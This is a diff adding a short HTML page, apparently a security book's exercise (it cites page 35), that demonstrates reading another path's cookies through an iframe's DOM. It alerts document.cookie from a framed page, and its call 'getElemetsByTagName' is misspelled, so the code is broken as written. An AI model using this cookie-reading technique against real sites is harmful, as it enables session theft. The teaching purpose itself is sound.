@@ -1,0 +1,31 @@
+<html>
+<script type="text/javascript">
+
+xc = function(src){
+var o = document.createElement("iframe");
+o.src = src;
+document.getElemetsByTagName("body")[0].appendChild(o);
+o.onload=function(){
+	d = o.contentDocument || o.contentWindow.document;
+	alert(d.cookie);
+    };
+}('http://onestar.me/appJS/other/index.php');
+
+</script>
+<body>
+<h3>
+get cookie from iframe.
+</h3>
+</body>
+
+<!--
+page 35
+如果/evil/路径想读取/admin/路径的Cookie，则可通过跨iframe进行DOM操作。
+
+
+测试代码：
+/chapter2/下的代码读取/other/下的Cookie；
+ -->
+
+
+</html>
